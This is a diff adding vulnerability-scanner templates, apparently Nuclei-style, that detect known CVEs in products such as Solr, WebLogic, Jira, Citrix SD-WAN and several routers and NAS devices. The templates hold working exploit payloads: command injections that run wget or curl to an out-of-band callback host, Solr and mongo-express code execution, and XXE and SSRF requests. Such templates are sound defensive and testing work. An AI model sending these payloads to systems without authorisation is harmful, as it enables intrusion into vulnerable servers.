@@ -101084,6 +101084,3792 @@
           ]
         }
       ]
+    },
+    {
+      "id": "cve-2009-4223",
+      "info": {
+        "name": "KR-Web <=1.1b2 - Remote File Inclusion",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2009",
+          "krweb",
+          "rfi",
+          "edb",
+          "gianni_tommasi",
+          "vuln"
+        ],
+        "cve": "CVE-2009-4223",
+        "prerequisite": false,
+        "cwe": "CWE-94"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/adm/krgourl.php?DOCUMENT_ROOT=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2014-3206",
+      "info": {
+        "name": "Seagate BlackArmor NAS - Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2014",
+          "cve",
+          "seagate",
+          "rce",
+          "edb",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2014-3206",
+        "prerequisite": false,
+        "cwe": "CWE-20"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /backupmgt/localJob.php?session=fail;wget+http://{{interactsh-url}}; HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "GET /backupmgt/pre_connect_check.php?auth_name=fail;wget+http://{{interactsh-url}}; HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2014-4210",
+      "info": {
+        "name": "Oracle Weblogic - Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve2014",
+          "cve",
+          "seclists",
+          "weblogic",
+          "oracle",
+          "ssrf",
+          "oast",
+          "xss"
+        ],
+        "cve": "CVE-2014-4210",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Search public registries"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2015-8813",
+      "info": {
+        "name": "Umbraco <7.4.0- Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve2015",
+          "cve",
+          "ssrf",
+          "oast",
+          "umbraco",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2015-8813",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/Umbraco/feedproxy.aspx?url=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2016-1555",
+      "info": {
+        "name": "NETGEAR WNAP320 Access Point Firmware - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2016",
+          "cve",
+          "seclists",
+          "packetstorm",
+          "netgear",
+          "rce",
+          "oast",
+          "router"
+        ],
+        "cve": "CVE-2016-1555",
+        "prerequisite": false,
+        "cwe": "CWE-77"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /boardDataWW.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nmacAddress=112233445566%3Bwget+http%3A%2F%2F{{interactsh-url}}%23&reginfo=0&writeData=Submit\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-0929",
+      "info": {
+        "name": "DotNetNuke (DNN) ImageHandler <9.2.0 - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve2017",
+          "cve",
+          "dnn",
+          "dotnetnuke",
+          "hackerone",
+          "oast",
+          "ssrf",
+          "dnnsoftware"
+        ],
+        "cve": "CVE-2017-0929",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/DnnImageHandler.ashx?mode=file&url=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-12629",
+      "info": {
+        "name": "Apache Solr <= 7.1 - XML Entity Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2017",
+          "cve",
+          "oast",
+          "xxe",
+          "vulhub",
+          "solr",
+          "apache",
+          "vuln"
+        ],
+        "cve": "CVE-2017-12629",
+        "prerequisite": false,
+        "cwe": "CWE-611"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F{{interactsh-url}}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-18638",
+      "info": {
+        "name": "Graphite <=1.1.5 - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2017",
+          "graphite",
+          "ssrf",
+          "oast",
+          "graphite_project",
+          "vuln"
+        ],
+        "cve": "CVE-2017-18638",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/composer/send_email?to={{rand_text_alpha(4)}}@{{rand_text_alpha(4)}}&url=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-3506",
+      "info": {
+        "name": "Oracle Fusion Middleware Weblogic Server - Remote OS Command Execution",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2017",
+          "rce",
+          "oast",
+          "hackerone",
+          "weblogic",
+          "oracle",
+          "kev"
+        ],
+        "cve": "CVE-2017-3506",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\n        <void id=\"url\" class=\"java.net.URL\">\n          <string>http://{{interactsh-url}}</string>\n        </void>\n        <void idref=\"url\">\n          <void id=\"stream\" method =\"openStream\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n    </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-9506",
+      "info": {
+        "name": "Atlassian Jira IconURIServlet - Cross-Site Scripting/Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2017",
+          "atlassian",
+          "jira",
+          "ssrf",
+          "oast",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2017-9506",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-1000600",
+      "info": {
+        "name": "Jenkins GitHub Plugin <=1.29.1 - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2018",
+          "jenkins",
+          "ssrf",
+          "oast",
+          "github",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2018-1000600",
+        "prerequisite": false,
+        "cwe": "CWE-200"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-10562",
+      "info": {
+        "name": "Dasan GPON Devices - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2018",
+          "dasan",
+          "gpon",
+          "rce",
+          "oast",
+          "kev",
+          "dasannetworks"
+        ],
+        "cve": "CVE-2018-10562",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /GponForm/diag_Form?images/ HTTP/1.1\nHost: {{Hostname}}\n\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+curl+http%3a//{{interactsh-url}}+-H+'User-Agent%3a+{{useragent}}'`;busybox wget http://{{interactsh-url}}&ipv=0\n",
+            "POST /GponForm/diag_Form?images/ HTTP/1.1\nHost: {{Hostname}}\n\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`curl+http%3a//{{interactsh-url}}+-H+'User-Agent%3a+{{useragent}}'`;wget http://{{interactsh-url}}&ipv=0\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-10818",
+      "info": {
+        "name": "LG NAS Devices - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2018",
+          "lg-nas",
+          "rce",
+          "oast",
+          "injection",
+          "vuln"
+        ],
+        "cve": "CVE-2018-10818",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: {{useragent}}"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /system/sharedir.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n&uid=10; curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'\n",
+            "POST /en/php/usb_sync.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n&act=sync&task_number=1;curl http://{{interactsh-url}} -H 'User-Agent: {{useragent}}'\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-15517",
+      "info": {
+        "name": "D-Link Central WifiManager - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2018",
+          "seclists",
+          "packetstorm",
+          "dlink",
+          "ssrf",
+          "oast",
+          "vkev"
+        ],
+        "cve": "CVE-2018-15517",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/index.php/System/MailConnect/host/{{interactsh-url}}/port/80/secure/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-16167",
+      "info": {
+        "name": "LogonTracer <=1.2.0 - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2018",
+          "rce",
+          "oast",
+          "edb",
+          "logontracer",
+          "intrusive",
+          "jpcert"
+        ],
+        "cve": "CVE-2018-16167",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlogtype=XML&timezone=1%3Bwget+http%3A%2F%2F{{interactsh-url}}%3B\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-0193",
+      "info": {
+        "name": "Apache Solr DataImportHandler <8.2.0 - Remote Code Execution",
+        "severity": "high",
+        "tags": [
+          "cve2019",
+          "cve",
+          "apache",
+          "rce",
+          "solr",
+          "oast",
+          "kev",
+          "vulhub"
+        ],
+        "cve": "CVE-2019-0193",
+        "prerequisite": false,
+        "cwe": "CWE-94"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: curl"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nConnection: close\n",
+            "POST /solr/{{core}}/dataimport?indent=on&wt=json HTTP/1.1\nHost: {{Hostname}}\nContent-type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\n\ncommand=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22curl%20{{interactsh-url}}%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-10758",
+      "info": {
+        "name": "mongo-express Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2019",
+          "vulhub",
+          "mongo",
+          "mongo-express",
+          "kev",
+          "mongo-express_project",
+          "node.js"
+        ],
+        "cve": "CVE-2019-10758",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /checkValid HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46cGFzcw==\nContent-Type: application/x-www-form-urlencoded\n\ndocument=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"curl {{interactsh-url}}\")\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12985",
+      "info": {
+        "name": "Citrix SD-WAN Center - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2019",
+          "citrix",
+          "rce",
+          "unauth",
+          "oast",
+          "tenable",
+          "vkev"
+        ],
+        "cve": "CVE-2019-12985",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "dsl",
+              "dsl": [
+                "contains(body_1, \"<title>Citrix SD-WAN</title>\")"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /Collector/diagnostics/ping HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nipAddress=%60/bin/wget+http://{{interactsh-url}}%60\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12986",
+      "info": {
+        "name": "Citrix SD-WAN Center - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve2019",
+          "cve",
+          "unauth",
+          "oast",
+          "tenable",
+          "citrix",
+          "rce",
+          "vkev"
+        ],
+        "cve": "CVE-2019-12986",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "dsl",
+              "dsl": [
+                "contains(body_1, \"<title>Citrix SD-WAN</title>\")"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /Collector/diagnostics/trace_route HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nipAddress=%60/bin/wget+http://{{interactsh-url}}%60\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12987",
+      "info": {
+        "name": "Citrix SD-WAN Center - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2019",
+          "citrix",
+          "rce",
+          "unauth",
+          "oast",
+          "tenable",
+          "vkev"
+        ],
+        "cve": "CVE-2019-12987",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "dsl",
+              "dsl": [
+                "contains(body_1, \"<title>Citrix SD-WAN</title>\")"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /login HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /Collector/storagemgmt/apply?data%5B0%5D%5Bhost%5D=%60/bin/wget+http://{{interactsh-url}}%60&data%5B0%5D%5Bpath%5D=mypath&data%5B0%5D%5Btype%5D=mytype HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-12988",
+      "info": {
+        "name": "Citrix SD-WAN Center - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2019",
+          "rce",
+          "unauth",
+          "oast",
+          "tenable",
+          "citrix",
+          "vkev"
+        ],
+        "cve": "CVE-2019-12988",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "dsl",
+              "dsl": [
+                "contains(body_1, \"<title>Citrix SD-WAN</title>\")"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /login HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://{{interactsh-url}}) HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-17558",
+      "info": {
+        "name": "Apache Solr <=8.3.1 - Remote Code Execution",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2019",
+          "kev",
+          "packetstorm",
+          "apache",
+          "rce",
+          "solr",
+          "oast"
+        ],
+        "cve": "CVE-2019-17558",
+        "prerequisite": false,
+        "cwe": "CWE-74"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "GET /solr/admin/cores?wt=json HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /solr/{{core}}/config HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n    \"update-queryresponsewriter\": {\n      \"startup\": \"lazy\",\n      \"name\": \"velocity\",\n      \"class\": \"solr.VelocityResponseWriter\",\n      \"template.base.dir\": \"\",\n      \"solr.resource.loader.enabled\": \"true\",\n      \"params.resource.loader.enabled\": \"true\"\n    }\n}\n",
+            "GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-19824",
+      "info": {
+        "name": "TOTOLINK Realtek SD Routers - Remote Command Injection",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2019",
+          "totolink",
+          "rce",
+          "router",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2019-19824",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /boafrm/formSysCmd HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\nContent-Type: application/x-www-form-urlencoded\n\nsubmit-url=%2Fsyscmd.htm&sysCmdselect=5&sysCmdselects=0&save_apply=Run+Command&sysCmd=wget+http://{{interactsh-url}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-20224",
+      "info": {
+        "name": "Pandora FMS 7.0NG - Remote Command Injection",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2019",
+          "pandorafms",
+          "rce",
+          "authenticated",
+          "oast",
+          "artica",
+          "vuln"
+        ],
+        "cve": "CVE-2019-20224",
+        "prerequisite": false,
+        "cwe": "CWE-78"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /pandora_console/index.php?login=1 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnick=admin&pass=admin&login_button=Login\n",
+            "POST /pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ndate=0&time=0&period=0&interval_length=0&chart_type=netflow_area&max_aggregates=1&address_resolution=0&name=0&assign_group=0&filter_type=0&filter_id=0&filter_selected=0&ip_dst=0&ip_src=%22%3Bcurl+{{interactsh-url}}+%23&draw_button=Draw\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-2616",
+      "info": {
+        "name": "Oracle Business Intelligence/XML Publisher - XML External Entity Injection",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2019",
+          "oracle",
+          "xxe",
+          "oast",
+          "kev",
+          "edb",
+          "vkev"
+        ],
+        "cve": "CVE-2019-2616",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /xmlpserver/ReportTemplateService.xls HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: text/xml; charset=UTF-8\n\n<!DOCTYPE soap:envelope PUBLIC \"-//B/A/EN\" \"http://{{interactsh-url}}\">\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-2767",
+      "info": {
+        "name": "Oracle Business Intelligence Publisher - XML External Entity Injection",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2019",
+          "edb",
+          "oracle",
+          "xxe",
+          "oast",
+          "vkev",
+          "vuln"
+        ],
+        "cve": "CVE-2019-2767",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /xmlpserver/convert?xml=<%3fxml+version%3d\"1.0\"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+\"http%3a//{{interactsh-url}}/xxe.xml\">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-3929",
+      "info": {
+        "name": "Barco/AWIND OEM Presentation Platform - Remote Command Injection",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2019",
+          "tenable",
+          "oast",
+          "injection",
+          "kev",
+          "edb",
+          "rce"
+        ],
+        "cve": "CVE-2019-3929",
+        "prerequisite": false,
+        "cwe": "CWE-78,CWE-79"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "/cgi-bin/file_transfer.cgi"
+          ],
+          "body": "file_transfer=new&dir=%27Pa_Noteexpr%20curl%2b{{interactsh-url}}Pa_Note%27",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-5591",
+      "info": {
+        "name": "FortiOS - Insecure LDAP Configuration Detection",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2019",
+          "fortinet",
+          "ldap",
+          "kev",
+          "vkev",
+          "oast"
+        ],
+        "cve": "CVE-2019-5591",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body_1",
+              "words": [
+                "name=\"username\"",
+                "name=\"secretkey\""
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "dsl",
+              "dsl": [
+                "contains(body_2, \"0\")",
+                "contains(body_2, \"1\")",
+                "contains(body_2, \"2\")"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "word",
+              "part": "body_2",
+              "words": [
+                "ajax=1&username="
+              ],
+              "condition": "or",
+              "negative": true
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "dns",
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "GET /login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /logincheck HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain;charset=UTF-8\n\najax=1&username={{username}}&secretkey={{interactsh-url}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-8451",
+      "info": {
+        "name": "Jira <8.4.0 - Server-Side Request Forgery",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2019",
+          "atlassian",
+          "jira",
+          "ssrf",
+          "oast",
+          "tenable",
+          "hackerone"
+        ],
+        "cve": "CVE-2019-8451",
+        "prerequisite": false,
+        "cwe": "CWE-918"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "/plugins/servlet/gadgets/makeRequest"
+          ],
+          "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
+          "headers": {
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-10770",
